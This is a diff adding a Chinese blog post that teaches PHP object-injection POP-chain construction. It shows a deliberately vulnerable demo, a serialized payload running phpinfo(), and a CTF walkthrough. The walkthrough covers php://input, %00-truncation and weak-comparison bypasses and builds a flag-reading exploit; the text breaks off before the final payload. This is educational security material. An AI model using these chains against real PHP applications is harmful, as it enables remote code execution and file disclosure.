@@ -1,0 +1,328 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head><meta name="generator" content="Hexo 3.8.0">
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="description" content="0x01 pop链我们知道，PHP反序列化漏洞的问题点是出在写得不安全的魔法函数上，有漏洞的魔法函数会让攻击者构造恶意的exp来触发，因为魔法函数会自动调用从而触发漏洞。 但如果漏洞代码不在魔法方法中，而是在一个类的普通方法中，这时就可以通过寻找相同的函数名将类的属性和敏感函数的属性联系起来。因为PHP反序列化可以控制类属性，无论是private还是public。 看个Demo就容易理解了。 12">
+<meta name="keywords" content="Web安全,PHP">
+<meta property="og:type" content="article">
+<meta property="og:title" content="PHP对象注入之pop链构造">
+<meta property="og:url" content="https://Mi1k7ea.github.com/2019/05/04/PHP对象注入之pop链构造/index.html">
+<meta property="og:site_name" content="Mi1k7ea">
+<meta property="og:description" content="0x01 pop链我们知道，PHP反序列化漏洞的问题点是出在写得不安全的魔法函数上，有漏洞的魔法函数会让攻击者构造恶意的exp来触发，因为魔法函数会自动调用从而触发漏洞。 但如果漏洞代码不在魔法方法中，而是在一个类的普通方法中，这时就可以通过寻找相同的函数名将类的属性和敏感函数的属性联系起来。因为PHP反序列化可以控制类属性，无论是private还是public。 看个Demo就容易理解了。 12">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="https://mi1k7ea.github.com/2019/05/04/PHP对象注入之pop链构造/1.png">
+<meta property="og:image" content="https://mi1k7ea.github.com/2019/05/04/PHP对象注入之pop链构造/2.png">
+<meta property="og:updated_time" content="2019-05-04T12:41:35.133Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="PHP对象注入之pop链构造">
+<meta name="twitter:description" content="0x01 pop链我们知道，PHP反序列化漏洞的问题点是出在写得不安全的魔法函数上，有漏洞的魔法函数会让攻击者构造恶意的exp来触发，因为魔法函数会自动调用从而触发漏洞。 但如果漏洞代码不在魔法方法中，而是在一个类的普通方法中，这时就可以通过寻找相同的函数名将类的属性和敏感函数的属性联系起来。因为PHP反序列化可以控制类属性，无论是private还是public。 看个Demo就容易理解了。 12">
+<meta name="twitter:image" content="https://mi1k7ea.github.com/2019/05/04/PHP对象注入之pop链构造/1.png">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>PHP对象注入之pop链构造</title>
+    <!-- styles -->
+    <link rel="stylesheet" href="/css/style.css">
+    <!-- persian styles -->
+    
+      <link rel="stylesheet" href="/css/rtl.css">
+    
+    <!-- rss -->
+    
+    
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">H0m3</a></li>
+         
+          <li><a href="/categories/">C4teg0ri3s</a></li>
+         
+          <li><a href="/tags/">74gs</a></li>
+         
+          <li><a href="/about/">Ab0ut</a></li>
+         
+          <li><a href="https://blog.csdn.net/ski_12/">01d-b10g</a></li>
+         
+          <li><a href="/atom.xml">R55</a></li>
+        
+      </ul>
+    </span>
+    <br>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" href="/2019/04/27/堆基础/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://Mi1k7ea.github.com/2019/05/04/PHP对象注入之pop链构造/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=https://Mi1k7ea.github.com/2019/05/04/PHP对象注入之pop链构造/&text=PHP对象注入之pop链构造"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://Mi1k7ea.github.com/2019/05/04/PHP对象注入之pop链构造/&title=PHP对象注入之pop链构造"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://Mi1k7ea.github.com/2019/05/04/PHP对象注入之pop链构造/&is_video=false&description=PHP对象注入之pop链构造"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=PHP对象注入之pop链构造&body=Check out this article: https://Mi1k7ea.github.com/2019/05/04/PHP对象注入之pop链构造/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=https://Mi1k7ea.github.com/2019/05/04/PHP对象注入之pop链构造/&title=PHP对象注入之pop链构造"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=https://Mi1k7ea.github.com/2019/05/04/PHP对象注入之pop链构造/&title=PHP对象注入之pop链构造"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://Mi1k7ea.github.com/2019/05/04/PHP对象注入之pop链构造/&title=PHP对象注入之pop链构造"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=https://Mi1k7ea.github.com/2019/05/04/PHP对象注入之pop链构造/&title=PHP对象注入之pop链构造"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://Mi1k7ea.github.com/2019/05/04/PHP对象注入之pop链构造/&name=PHP对象注入之pop链构造&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-pop链"><span class="toc-number">1.</span> <span class="toc-text">0x01 pop链</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-练习"><span class="toc-number">2.</span> <span class="toc-text">0x02 练习</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-一道CTF题目"><span class="toc-number">3.</span> <span class="toc-text">0x03 一道CTF题目</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#弱类型Bypass"><span class="toc-number">3.1.</span> <span class="toc-text">弱类型Bypass</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pop链构造"><span class="toc-number">3.2.</span> <span class="toc-text">pop链构造</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#getflag"><span class="toc-number">3.3.</span> <span class="toc-text">getflag</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-参考"><span class="toc-number">4.</span> <span class="toc-text">0x04 参考</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope="" itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        PHP对象注入之pop链构造
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+        <span itemprop="name">Mi1k7ea</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2019-05-04T07:31:31.000Z" itemprop="datePublished">2019-05-04</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/PHP/">PHP</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link" href="/tags/PHP/">PHP</a>, <a class="tag-link" href="/tags/Web安全/">Web安全</a>
+    </div>
+    <div class="article-tag">
+        <i class="fas fa-eye"></i>
+        阅读量：<span id="busuanzi_value_page_pv"></span>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h2 id="0x01-pop链"><a href="#0x01-pop链" class="headerlink" title="0x01 pop链"></a>0x01 pop链</h2><p>我们知道，PHP反序列化漏洞的问题点是出在写得不安全的魔法函数上，有漏洞的魔法函数会让攻击者构造恶意的exp来触发，因为魔法函数会自动调用从而触发漏洞。</p>
+<p><strong>但如果漏洞代码不在魔法方法中，而是在一个类的普通方法中，这时就可以通过寻找相同的函数名将类的属性和敏感函数的属性联系起来。因为PHP反序列化可以控制类属性，无论是private还是public。</strong></p>
+<p>看个Demo就容易理解了。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">mi1k7ea</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $ClassObj;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;ClassObj = <span class="keyword">new</span> normal();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;ClassObj-&gt;action();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">normal</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">action</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"hello"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">evil</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $data;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">action</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;data);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">unserialize($_GET[<span class="string">'d'</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>mi1k7ea这个类本来是调用normal类的，而normal类中含有action()方法用于显示字符串，但是现在action()方法在evil类里面也有，所以可以构造pop链，调用evil类中的action()方法。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">mi1k7ea</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $ClassObj;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;ClassObj = <span class="keyword">new</span> evil();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">evil</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $data = <span class="string">"phpinfo();"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$m7 = <span class="keyword">new</span> mi1k7ea();</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($m7));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>注意的是，protected $ClassObj = new evil();是不行的，还是通过__construct来实例化。</p>
+<p>payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O%3A7%3A%22mi1k7ea%22%3A1%3A%7Bs%3A11%3A%22%00%2A%00ClassObj%22%3BO%3A4%3A%22evil%22%3A1%3A%7Bs%3A10%3A%22%00evil%00data%22%3Bs%3A10%3A%22phpinfo%28%29%3B%22%3B%7D%7D</span><br></pre></td></tr></table></figure>
+<p><img src="/2019/05/04/PHP对象注入之pop链构造/1.png" alt=""></p>
+<h2 id="0x02-练习"><a href="#0x02-练习" class="headerlink" title="0x02 练习"></a>0x02 练习</h2><p>…</p>
+<h2 id="0x03-一道CTF题目"><a href="#0x03-一道CTF题目" class="headerlink" title="0x03 一道CTF题目"></a>0x03 一道CTF题目</h2><p>访问页面，看到源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    <span class="comment">//flag is in flag.php </span></span><br><span class="line">    error_reporting(<span class="number">0</span>); </span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">oops</span> </span>&#123; </span><br><span class="line">        <span class="keyword">protected</span> $oop; </span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123; </span><br><span class="line">            <span class="keyword">$this</span>-&gt;oop = <span class="keyword">new</span> a(); </span><br><span class="line">        &#125; </span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123; </span><br><span class="line">            <span class="keyword">$this</span>-&gt;oop-&gt;action(); </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">a</span> </span>&#123; </span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">action</span><span class="params">()</span> </span>&#123; </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"Hello World!"</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">b</span> </span>&#123; </span><br><span class="line">        <span class="keyword">private</span> $file; </span><br><span class="line">        <span class="keyword">private</span> $token; </span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">action</span><span class="params">()</span> </span>&#123; </span><br><span class="line">            <span class="keyword">if</span> ((ord(<span class="keyword">$this</span>-&gt;token)&gt;<span class="number">47</span>)&amp;(ord(<span class="keyword">$this</span>-&gt;token)&lt;<span class="number">58</span>)) &#123; </span><br><span class="line">                <span class="keyword">echo</span> <span class="string">"token can't be a number!"</span>; </span><br><span class="line">                <span class="keyword">return</span> ; </span><br><span class="line">            &#125; </span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;token==<span class="number">0</span>)&#123; </span><br><span class="line">                <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;file) &amp;&amp; stripos(<span class="keyword">$this</span>-&gt;file,<span class="string">'..'</span>)===<span class="keyword">FALSE</span>   </span><br><span class="line">                &amp;&amp; stripos(<span class="keyword">$this</span>-&gt;file,<span class="string">'/'</span>)===<span class="keyword">FALSE</span> &amp;&amp; stripos(<span class="keyword">$this</span>-&gt;file,<span class="string">'\\'</span>)==<span class="keyword">FALSE</span>) &#123; </span><br><span class="line">                    <span class="keyword">include</span>(<span class="keyword">$this</span>-&gt;file); </span><br><span class="line">                    <span class="keyword">echo</span> $flag; </span><br><span class="line">                &#125; </span><br><span class="line">            &#125;<span class="keyword">else</span>&#123; </span><br><span class="line">                <span class="keyword">echo</span> <span class="string">"Oops..."</span>; </span><br><span class="line">            &#125; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">c</span> </span>&#123; </span><br><span class="line">        <span class="keyword">private</span> $cmd; </span><br><span class="line">        <span class="keyword">private</span> $token; </span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">execcmd</span><span class="params">()</span></span>&#123; </span><br><span class="line">            <span class="keyword">if</span> ((ord(<span class="keyword">$this</span>-&gt;token)&gt;<span class="number">47</span>)&amp;(ord(<span class="keyword">$this</span>-&gt;token)&lt;<span class="number">58</span>)) &#123; </span><br><span class="line">                <span class="keyword">echo</span> <span class="string">"token can't be a number!"</span>; </span><br><span class="line">                <span class="keyword">return</span> ; </span><br><span class="line">            &#125; </span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;token==<span class="number">0</span>)&#123; </span><br><span class="line">                <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;cmd))&#123; </span><br><span class="line">                    system(<span class="keyword">$this</span>-&gt;cmd); </span><br><span class="line">                &#125; </span><br><span class="line">            &#125;<span class="keyword">else</span>&#123; </span><br><span class="line">                <span class="keyword">echo</span> <span class="string">"Oops..."</span>; </span><br><span class="line">            &#125; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'a'</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>($_GET[<span class="string">'b'</span>])) &#123; </span><br><span class="line">        $a=$_GET[<span class="string">'a'</span>]; </span><br><span class="line">        $b=$_GET[<span class="string">'b'</span>]; </span><br><span class="line">        <span class="keyword">if</span> (stripos($a,<span class="string">'.'</span>)) &#123; </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"You can't input '.' !"</span>; </span><br><span class="line">            <span class="keyword">return</span> ; </span><br><span class="line">        &#125; </span><br><span class="line">        $data = @file_get_contents($a,<span class="string">'r'</span>); </span><br><span class="line">        <span class="keyword">if</span> ($data==<span class="string">"HelloWorld!"</span> <span class="keyword">and</span> strlen($b)&gt;<span class="number">5</span> <span class="keyword">and</span> eregi(<span class="string">"666"</span>.substr($b,<span class="number">0</span>,<span class="number">1</span>),<span class="string">"6668"</span>) <span class="keyword">and</span> substr($b,<span class="number">0</span>,<span class="number">1</span>)!=<span class="number">8</span>)&#123; </span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'c'</span>]))&#123; </span><br><span class="line">                <span class="keyword">echo</span> <span class="string">"get c 2333......&lt;br&gt;"</span>; </span><br><span class="line">                unserialize($_GET[<span class="string">'c'</span>]); </span><br><span class="line">            &#125; <span class="keyword">else</span> &#123; </span><br><span class="line">                <span class="keyword">echo</span> <span class="string">"cccccc......"</span>; </span><br><span class="line">            &#125; </span><br><span class="line">        &#125; <span class="keyword">else</span> &#123; </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"Oh no......"</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123; </span><br><span class="line">        show_source(<span class="keyword">__FILE__</span>); </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>简单看下，考察两个点，一个是3处的弱类型校验，即参数a、b以及类成员变量token，另一个是反序列化pop链的构造。</p>
+<h3 id="弱类型Bypass"><a href="#弱类型Bypass" class="headerlink" title="弱类型Bypass"></a>弱类型Bypass</h3><p>先看下参数a和b，要同时通过GET输入并绕过类型比较才能往下执行到反序列化的逻辑：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (stripos($a,<span class="string">'.'</span>)) &#123; </span><br><span class="line"><span class="keyword">echo</span> <span class="string">"You can't input '.' !"</span>; </span><br><span class="line"><span class="keyword">return</span> ; </span><br><span class="line">&#125; </span><br><span class="line">$data = @file_get_contents($a,<span class="string">'r'</span>); </span><br><span class="line"><span class="keyword">if</span> ($data==<span class="string">"HelloWorld!"</span> <span class="keyword">and</span> strlen($b)&gt;<span class="number">5</span> <span class="keyword">and</span> eregi(<span class="string">"666"</span>.substr($b,<span class="number">0</span>,<span class="number">1</span>),<span class="string">"6668"</span>) <span class="keyword">and</span> substr($b,<span class="number">0</span>,<span class="number">1</span>)!=<span class="number">8</span>)</span><br></pre></td></tr></table></figure>
+<ul>
+<li>对于参数a，不能输入“.”，过滤了跨目录访问，并且调用file_get_contents()函数读取名为a的文件内容，且内容为”HelloWorld!”——<strong>解决办法：file_get_contents()函数支持php伪协议，这里我们可以使用php:/input，然后再POST字符串”HelloWorld!”即可绕过</strong></li>
+<li>对于参数b，其长度必须大于5，第一个字符紧接着拼接在”666”字符串后面要能正则匹配上”6668”字符串，且限定第一个字符不能为8——<strong>解决办法：这里限定了参数第一个字符不能为8，但是缺陷在于使用正则匹配，我们这里可以使用%00截断作为参数b的起始字符，截断掉后面的字符从而实现666和6668能够匹配成功实现绕过，剩下的字符拼够5个字节以上即可</strong></li>
+</ul>
+<p>再看下成员变量token，其在类b和类c中均存在：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">b</span> </span>&#123; </span><br><span class="line">       <span class="keyword">private</span> $file; </span><br><span class="line">       <span class="keyword">private</span> $token; </span><br><span class="line">       <span class="function"><span class="keyword">function</span> <span class="title">action</span><span class="params">()</span> </span>&#123; </span><br><span class="line">           <span class="keyword">if</span> ((ord(<span class="keyword">$this</span>-&gt;token)&gt;<span class="number">47</span>)&amp;(ord(<span class="keyword">$this</span>-&gt;token)&lt;<span class="number">58</span>)) &#123; </span><br><span class="line">               <span class="keyword">echo</span> <span class="string">"token can't be a number!"</span>; </span><br><span class="line">               <span class="keyword">return</span> ; </span><br><span class="line">           &#125; </span><br><span class="line">           <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;token==<span class="number">0</span>)&#123; </span><br><span class="line">               ...</span><br><span class="line"></span><br><span class="line">   <span class="class"><span class="keyword">class</span> <span class="title">c</span> </span>&#123; </span><br><span class="line">       <span class="keyword">private</span> $cmd; </span><br><span class="line">       <span class="keyword">private</span> $token; </span><br><span class="line">       <span class="function"><span class="keyword">function</span> <span class="title">execcmd</span><span class="params">()</span></span>&#123; </span><br><span class="line">           <span class="keyword">if</span> ((ord(<span class="keyword">$this</span>-&gt;token)&gt;<span class="number">47</span>)&amp;(ord(<span class="keyword">$this</span>-&gt;token)&lt;<span class="number">58</span>)) &#123; </span><br><span class="line">               <span class="keyword">echo</span> <span class="string">"token can't be a number!"</span>; </span><br><span class="line">               <span class="keyword">return</span> ; </span><br><span class="line">           &#125; </span><br><span class="line">           <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;token==<span class="number">0</span>)&#123; </span><br><span class="line">               ...</span><br></pre></td></tr></table></figure>
+<p>可以看到，先判断token是否为数字字符，不是才会往下判断token的值是否为0，为0则进入关键代码。<strong>但是这里判断是否为0的符号是==，存在弱类型绕过，当我们输入一个字符如a时，’a’==0是成立的。</strong></p>
+<h3 id="pop链构造"><a href="#pop链构造" class="headerlink" title="pop链构造"></a>pop链构造</h3><p>我们回到几个类的定义中再看看，发现只有oops类存在魔法函数__construct()和__destruct()，分析该函数：</p>
+<ul>
+<li>成员变量oop，在__construct()函数中初始化为a类的实例；</li>
+<li>__construct()函数，初始化成员变量oop为a类的实例；</li>
+<li>__destruct()函数，调用oop实例的action()方法；</li>
+</ul>
+<p>再看看其他几个类：</p>
+<ul>
+<li>a类只有输出Hello World的action()方法，无漏洞点；</li>
+<li>b类有个action()方法，含有成员变量file和token，绕过token校验之后就过滤file的跨目录，然后直接输出目标文件的flag变量值；</li>
+<li>c类有个execcmd()方法，但是和opps类__destruct()函数中调用的action()方法完全不同名，就是个坑哈哈；</li>
+</ul>
+<p>这么说，能利用的只有b类，且和源码注释中提示的flag在flag.php中吻合，那就直接构造payload即可：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">oops</span> </span>&#123; </span><br><span class="line">        <span class="keyword">protected</span> $oop; </span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123; </span><br><span class="line">            <span class="keyword">$this</span>-&gt;oop = <span class="keyword">new</span> b(); </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">b</span> </span>&#123; </span><br><span class="line">        <span class="keyword">private</span> $file = <span class="string">"flag.php"</span>; </span><br><span class="line">        <span class="keyword">private</span> $token = <span class="string">"a"</span>; </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> urlencode(serialize(<span class="keyword">new</span> oops()));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>输出参数c的exp为：</p>
